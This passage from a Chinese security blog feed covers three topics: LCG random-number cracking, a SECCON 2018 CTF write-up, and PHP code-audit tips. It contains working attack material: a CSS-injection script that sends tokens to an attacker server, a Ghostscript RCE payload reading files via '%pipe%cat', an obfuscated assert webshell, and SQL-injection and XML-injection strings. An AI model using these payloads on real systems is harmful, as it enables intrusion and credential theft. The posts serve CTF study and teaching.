n)</span><br><span class="line">s_2 - s_1 = m*(s1 - s0)  (mod n)</span><br><span class="line">m = (s_2 - s_1)/(s_1 - s_0)  (mod n)</span><br></pre></td></tr></table></figure><p>此种类型Python攻击代码如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def crack_unknown_multiplier(states, modulus):</span><br><span class="line">    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus</span><br><span class="line">    return crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line">print crack_unknown_multiplier([6473702802409947663, 6562621845583276653, 4483807506768649573], 9223372036854775783)</span><br></pre></td></tr></table></figure><p>这个算法中应用到了求模，所以我们就需要逆推。详情参考: <a href="https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm#Python" target="_blank" rel="noopener">Recursive algorithm</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def egcd(a, b):</span><br><span class="line">    if a == 0:</span><br><span class="line">        return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        return (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line">def modinv(b, n):</span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    if g == 1:</span><br><span class="line">        return x % n</span><br></pre></td></tr></table></figure><h3 id="4-增量，乘数和模数均未知"><a href="#4-增量，乘数和模数均未知" class="headerlink" title="4.增量，乘数和模数均未知"></a>4.增量，乘数和模数均未知</h3><p>现在内部状态基本是都不知道了，但是我们知道初值和随后LCG产生的连续的几个值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = # unknown</span><br><span class="line">c = # unknown</span><br><span class="line">n = # unknown</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s0 = 2818206783446335158</span><br><span class="line">s1 = 3026581076925130250</span><br><span class="line">s2 = 136214319011561377</span><br><span class="line">s3 = 359019108775045580</span><br><span class="line">s4 = 2386075359657550866</span><br><span class="line">s5 = 1705259547463444505</span><br><span class="line">s6 = 2102452637059633432</span><br></pre></td></tr></table></figure><p>这次用线性方程式不好解决的了，因为对于每一个方程，我们是不知道前一个模数，因此我们将形成的每个方程都会引入新的未知量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 = s0*m + c  (mod n)</span><br><span class="line">s2 = s1*m + c  (mod n)</span><br><span class="line">s3 = s2*m + c  (mod n)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 - (s0*m + c) = k_1 * n</span><br><span class="line">s2 - (s1*m + c) = k_2 * n</span><br><span class="line">s3 - (s2*m + c) = k_3 * n</span><br></pre></td></tr></table></figure><p>这就相当于六个未知数和三个方程。所以线性方程组是不可能行得通的了，但是数论里面有一条很有用:如果有几个随机数分别乘以n，那么这几个数的欧几里德算法(gcd)就很可能等于n。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [944]: n = 123456789</span><br><span class="line"></span><br><span class="line">In [945]: reduce(gcd, [randint(1, 1000000)*n, randint(1, 1000000)*n, randint(1, 1000000)*n])</span><br><span class="line">Out[945]: 123456789</span><br></pre></td></tr></table></figure><p>某些取模运算是会等于0的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X = 0 (mod n)</span><br></pre></td></tr></table></figure><p>然后，根据定义，这相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X = k*n</span><br></pre></td></tr></table></figure><p>所以这种X != 0但是X = 0 (mod n)的情况就很有趣。我们只需要取几个这样的值进行gcd运算，我们就可以解出n的值。这种是在模数未知的情况下十分常用的方法。</p><p>我们在此引入一个序列 – T(n) = S(n+1) - S(n):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t0 = s1 - s0</span><br><span class="line">t1 = s2 - s1 = (s1*m + c) - (s0*m + c) = m*(s1 - s0) = m*t0 (mod n)</span><br><span class="line">t2 = s3 - s2 = (s2*m + c) - (s1*m + c) = m*(s2 - s1) = m*t1 (mod n)</span><br><span class="line">t3 = s4 - s3 = (s3*m + c) - (s2*m + c) = m*(s3 - s2) = m*t2 (mod n)</span><br></pre></td></tr></table></figure><p>之后我们就可以得到我们想要的效果了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t2*t0 - t1*t1 = (m*m*t0 * t0) - (m*t0 * m*t0) = 0 (mod n)</span><br></pre></td></tr></table></figure><p>然后我们就可以生成几个这样模是0的值，进而利用我们上文讲述的技巧，此种类型Python攻击代码如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def crack_unknown_modulus(states):</span><br><span class="line">    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    return crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">print crack_unknown_modulus([2818206783446335158, 3026581076925130250,</span><br><span class="line">    136214319011561377, 359019108775045580, 2386075359657550866, 1705259547463444505])</span><br></pre></td></tr></table></figure><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>此处我们简述了对LCG的攻击方式，这种方式刚在P.W.N CTF中出现过，具体的题目以及解答可以参考我的下一篇文章–《P.W.N. CTF》中的LCG and the X题目解析。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator" target="_blank" rel="noopener">Cryptographically secure pseudorandom number generator</a></p><p><a href="https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm" target="_blank" rel="noopener">Lenstra–Lenstra–Lovász lattice basis reduction algorithm</a></p><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/" target="_blank" rel="noopener">Cracking RNGs: Linear Congruential Generators</a></p><p><a href="https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm#Python" target="_blank" rel="noopener">Algorithm Implementation/Mathematics/Extended Euclidean algorithm</a></p><p><a href="https://zh.wikipedia.org/wiki/%E7%B7%9A%E6%80%A7%E5%90%8C%E9%A4%98%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">线性同余方法</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;目前我们在编程中经常会使用随机数，但是其中会不会存在什么问题呢？要知道CPU计算中的各种状态都是确定
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SECCON 2018 Qualis GhostKingdom</title>
    <link href="http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/"/>
    <id>http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/</id>
    <published>2018-10-29T15:25:57.000Z</published>
    <updated>2018-10-29T15:35:24.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-问题分析"><a href="#0x00-问题分析" class="headerlink" title="0x00 问题分析"></a>0x00 问题分析</h3><p>题目链接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ghostkingdom.pwn.seccon.jp/FLAG/</span><br></pre></td></tr></table></figure><p>访问链接后的提示如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG is somewhere in this folder.   GO TO TOP</span><br></pre></td></tr></table></figure><p>首先是一个登录界面:</p><p><img src="https://i.loli.net/2018/10/29/5bd6e42077582.png" alt="屏幕快照 2018-10-29 下午6.41.59.png"></p><p>一通操作后发现没有注入，所以跟着逻辑注册登录继续往下看。</p><p>登录后发现侧面有三个功能，但是上传功能被禁止了，标识只有从本地登录才可以使用。尝试修改xxf等方式并没有成功，所以猜测可能是cookie认证问题？</p><p><img src="https://i.loli.net/2018/10/29/5bd6e489ec36b.png" alt="屏幕快照 2018-10-29 下午6.44.14.png"></p><p>但或者上传处不是关键点，先从上面两个功能开始测试。首先测试<code>Message to admin</code>，刚开始猜测可能此处会不会有一个xss bot，打个cookie回来。虽然这个输入框也不存在xss，也没有bot周期性地戳一下，但是在burp抓包中分析到一个css参数可控。联想到可能是CSS 注入读数据这个点，但是我还缺少一个从本地戳戳戳的bot！</p><p><img src="https://i.loli.net/2018/10/29/5bd6e6960b699.png" alt="屏幕快照 2018-10-29 下午6.50.11.png"></p><p><img src="https://i.loli.net/2018/10/29/5bd6e6675902f.png" alt="屏幕快照 2018-10-29 下午6.51.21.png"></p><p>此处我们decode一下这个base64可以看到是控制此处的输出样式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros  ~/Desktop  echo -n &quot;c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&quot; | base64 -D</span><br><span class="line">span&#123;background-color:red;color:yellow&#125;</span><br></pre></td></tr></table></figure><p>点击send to admin之后我看到一个csrf参数(有用？)</p><p><img src="https://i.loli.net/2018/10/29/5bd6e7a284b0f.png" alt="屏幕快照 2018-10-28 下午10.36.50.png"></p><p>好像无法但从这一个点入手，所以我决定看看<code>Take a screenshot</code>。</p><p><img src="https://i.loli.net/2018/10/29/5bd719ee71628.png" alt="屏幕快照 2018-10-29 下午10.31.41.png"></p><p>很明显是一个ssrf,不过file等协议都被限制了，302跳转好像也没开。虽然限制了127等，但是我们可以通过访问<code>http://0/</code>绕过，结果还是有惊喜的。</p><p><img src="https://i.loli.net/2018/10/29/5bd71b0ff2538.png" alt="屏幕快照 2018-10-29 下午10.36.37.png"></p><p>PS:扫描过程中发现了一个有趣的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ghostkingdom.pwn.seccon.jp/ghostMagick.cgi</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/29/5bd722370feba.png" alt="屏幕快照 2018-10-29 下午11.07.14.png"></p><p><strong>小结:</strong></p><p>本来我以为这题是三个点分别突破都可以获取flag，但现在看来不行，真是继承了KeigoYAMAZAKI一贯的出题风格，要综合以上信息，构造利用链来读取flag</p><h3 id="0x01-解题步骤"><a href="#0x01-解题步骤" class="headerlink" title="0x01 解题步骤"></a>0x01 解题步骤</h3><p>首先<code>Take a screenshot</code>处的ssrf可以让我们从<code>local network</code>那里进行登录，登录之后可以操作<code>Upload image</code>。</p><p><img src="https://i.loli.net/2018/10/29/5bd71fe91e67e.png" alt="屏幕快照 2018-10-28 下午10.32.30.png"></p><p>但是仅通过这个有限制的ssrf无法进一步利用了。所以换一个角度考虑，如果我们能够从<code>local network</code>获取<code>CGISESSID</code>在<code>from internet</code>进行登录就可以使用<code>Upload image</code>功能了呢？</p><p>有了这个思路接下来就是获取<code>CGISESSID</code>了，联想到<code>Message to admin</code>还有一个css inject可以用来读取数据，所以就可以ssrf+css inject联合来获取<code>CGISESSID</code>。</p><p>此处可以参考: <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html" target="_blank" rel="noopener">Reading Data via CSS Injection</a></p><p>服务器上使用php开个服务器来记录数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:2333</span><br></pre></td></tr></table></figure></p><p>对应的目录下可以放置如下log.php来帮助记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</span><br><span class="line">$ip       = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip</span><br><span class="line">$filename = $_SERVER[&apos;PHP_SELF&apos;];//访问者要访问的文件名</span><br><span class="line">$parameter   = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数</span><br><span class="line">$time     =   date(&apos;Y-m-d H:i:s&apos;,time()); //访问时间</span><br><span class="line">$logadd = &apos;来访时间：&apos;.$time.&apos;--&gt;&apos;.&apos;访问链接：&apos;.&apos;http://&apos;.$ip.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;</span><br><span class="line">// log记录</span><br><span class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>利用脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">CHARLIST = &quot;0123456789&quot; + &quot;abcdef&quot;</span><br><span class="line">URL = &quot;http://0/?msg=master&amp;action=msgadm2&amp;css=&quot;</span><br><span class="line">#</span><br><span class="line">known = &quot;bcc703c0693e6eff894ede&quot;</span><br><span class="line">buf = &quot;&quot;</span><br><span class="line">for char in CHARLIST:</span><br><span class="line">    buf += &quot;&quot;&quot;input[name=&quot;csrf&quot;][value^=&quot;&#123;&#125;&quot;] &#123;&#123;</span><br><span class="line">background: url(http://your server ip/log.php/&#123;&#125;);</span><br><span class="line">&#125;&#125;&quot;&quot;&quot;.format(known+char,known+char)</span><br><span class="line"></span><br><span class="line">print(URL + base64.b64encode(buf.encode(&apos;utf-8&apos;)).decode(&apos;utf-8&apos;))</span><br></pre></td></tr></table></figure></p><p>最终可以获取<code>CGISESSID</code>的值<br><img src="https://i.loli.net/2018/10/29/5bd7217a4e6c3.png" alt="屏幕快照 2018-10-29 下午11.04.08.png"></p><p>之后在浏览器中设置上我们获得的<code>CGISESSID</code>，就可以使用<code>Upload image</code>功能了。</p><p><img src="https://i.loli.net/2018/10/29/5bd722a10d369.png" alt="屏幕快照 2018-10-28 下午11.41.21.png"></p><p>测试一下<br><img src="https://i.loli.net/2018/10/29/5bd722f902495.png" alt="屏幕快照 2018-10-29 下午11.10.10.png"></p><p><img src="https://i.loli.net/2018/10/29/5bd722f8ee474.png" alt="屏幕快照 2018-10-29 下午11.10.37.png"></p><p>发现有个<code>Convert to GIF format</code>结合之前我们发现的<code>ghostMagick.cgi</code>很容易想到Ghostscript的rce漏洞。我们将以下代码保存为jpg，上传可以得flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%cat /var/www/html/FLAG/FLAGflagF1A8.txt) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/29/5bd723bdf3a02.png" alt="屏幕快照 2018-10-29 上午12.03.49.png"></p><p><code>SECCON{CSSinjection+GhostScript/ImageMagickRCE}</code></p><h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h3><p><a href="https://graneed.hatenablog.com/entry/2018/10/28/150722" target="_blank" rel="noopener">https://graneed.hatenablog.com/entry/2018/10/28/150722</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-问题分析&quot;&gt;&lt;a href=&quot;#0x00-问题分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 问题分析&quot;&gt;&lt;/a&gt;0x00 问题分析&lt;/h3&gt;&lt;p&gt;题目链接:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP代码审计中的一些Tips</title>
    <link href="http://zer0yu.github.io/2018/10/13/php-audit-tips/"/>
    <id>http://zer0yu.github.io/2018/10/13/php-audit-tips/</id>
    <published>2018-10-13T11:15:36.000Z</published>
    <updated>2019-03-13T04:47:51.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-eregi"><a href="#1-eregi" class="headerlink" title="1.eregi"></a>1.eregi</h4><p>此函数可以被%00截断</p><p>比如下面这个例子，可以使用$b=”%001111”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//%00好像算一个字节</span><br><span class="line">if(strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">    require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，如果传入数组，函数会报错并返回NULL。</p><h4 id="2-assert"><a href="#2-assert" class="headerlink" title="2.assert"></a>2.assert</h4><p>PHP中的assert可以用来执行PHP函数，进而进行getshell等操作，比如我们利用如下代码进行目录扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$poc = &quot;a#s#s#e#r#t&quot;;</span><br><span class="line">$poc_1 = explode(&quot;#&quot;, $poc);$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];</span><br><span class="line">$poc_2($_GET[&apos;s&apos;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload <code>s=print_r(scandir(&#39;./&#39;));</code></p><h4 id="3-md5-amp-sha1"><a href="#3-md5-amp-sha1" class="headerlink" title="3.md5&amp;sha1"></a>3.md5&amp;sha1</h4><p>PHP中的md5和sha1函数存在两个问题，第一是他们处理数组都返回null；第二在弱类型条件下他们会认为如下的返回值相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"> sha1(str)</span><br><span class="line">sha1(&apos;aaroZmOk&apos;)  </span><br><span class="line">sha1(&apos;aaK1STfY&apos;)</span><br><span class="line">sha1(&apos;aaO8zKZF&apos;)</span><br><span class="line">sha1(&apos;aa3OFF9m&apos;)</span><br></pre></td></tr></table></figure><p>注意：如果使用了md5并且是强相等，那么找到数据对应md5相同的值即可，在此给出一组某强网杯使用过的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">#008ee33a9d58b51cfeb425b0959121c9</span><br></pre></td></tr></table></figure><p>此外我们观察定义可以得到另外一点，通过设置raw_output参数的值为true，我们可以达到一个\，从而进行sql注入</p><blockquote><p>string md5 ( string $str [, bool $raw_output = false ] )</p><p>str<br>原始字符串。</p><p>raw_output<br>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(md5(128,true));</span><br><span class="line">string(16) &quot;v�an���l���q��\&quot;</span><br><span class="line"></span><br><span class="line">//可以看到字符串ffifdyop被md5后会产生&apos;or&apos;，从而可以产生万能密码进行登录</span><br><span class="line">php &gt; echo md5(&quot;ffifdyop&quot;,true);</span><br><span class="line">&apos;or&apos;6�]��!r,��b</span><br><span class="line"></span><br><span class="line">php &gt; echo md5(&quot;129581926211651571912466741651878684928&quot;,true);</span><br><span class="line">�T0D��o#��&apos;or&apos;8</span><br><span class="line"></span><br><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">count:   18933549</span><br><span class="line">hex:     06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw:     ?T0D??o#??&apos;or&apos;8.N=?</span><br></pre></td></tr></table></figure><p>参考: <a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="noopener">SQL injection with raw MD5 hashes</a></p><h4 id="4-strcmp"><a href="#4-strcmp" class="headerlink" title="4.strcmp"></a>4.strcmp</h4><p>注：5.3之前版本的php存在如下问题</p><p>当这个函数接受到了不符合的类型，这个函数将发生错误并返回0，因而可以使用数组绕过验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="5-ereg"><a href="#5-ereg" class="headerlink" title="5.ereg"></a>5.ereg</h4><p>ereg()函数只能处理字符，如果传入数组将返回null</p><h4 id="6-strpos"><a href="#6-strpos" class="headerlink" title="6.strpos"></a>6.strpos</h4><p>strpos()的参数不能够是数组，所以处理数组返回的是null</p><p>strpos()与PHP的自动类型转换结合也会出在哪问题</p><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(strpos(&apos;abcd&apos;,&apos;a&apos;));       # 0</span><br><span class="line">var_dump(strpos(&apos;abcd&apos;,&apos;x&apos;));       # false</span><br></pre></td></tr></table></figure><p>并且由于PHP的自动类型转换的关系，0和false是相等的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(0==false);         # true</span><br></pre></td></tr></table></figure><p>例题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Login &#123;</span><br><span class="line">    public function __construct($user, $pass) &#123;</span><br><span class="line">        $this-&gt;loginViaXml($user, $pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function loginViaXml($user, $pass) &#123;</span><br><span class="line">        if (</span><br><span class="line">            (!strpos($user, &apos;&lt;&apos;) || !strpos($user, &apos;&gt;&apos;)) &amp;&amp;</span><br><span class="line">            (!strpos($pass, &apos;&lt;&apos;) || !strpos($pass, &apos;&gt;&apos;))</span><br><span class="line">        ) &#123;</span><br><span class="line">            $format = &apos;&lt;xml&gt;&lt;user=&quot;%s&quot;/&gt;&lt;pass=&quot;%s&quot;/&gt;&lt;/xml&gt;&apos;;</span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $xmlElement = new SimpleXMLElement($xml);</span><br><span class="line">            // Perform the actual login.</span><br><span class="line">            $this-&gt;login($xmlElement);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Login($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]);</span><br></pre></td></tr></table></figure><p>传入的username和password的首位字符是&lt;或者是&gt;就可以绕过限制，那么最后的pyaload就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</span><br></pre></td></tr></table></figure><p>最终传入到$this-&gt;login($xmlElement)的$xmlElement值是<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code>这样就可以进行注入了。</p><h4 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="7.is_numeric"></a>7.is_numeric</h4><p>is_numeric()函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p><p>此外，is_numeric()函数在判断是否是数字时会忽略字符串开头的’ ‘、’\t’、’\n’、’\r’、’\v’、’\f’。而’.’可以出现在任意位置，E、e能出现在参数中间，仍可以被判断为数字。也就是说is_numeric(“\r\n\t 0.1e2”) &gt;&gt; TRUE</p><h4 id="8-ord"><a href="#8-ord" class="headerlink" title="8.ord"></a>8.ord</h4><p>ord()函数返回字符串的首个字符的 ASCII 值</p><p>例如下面这道题目，我们可以用16进制绕过限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 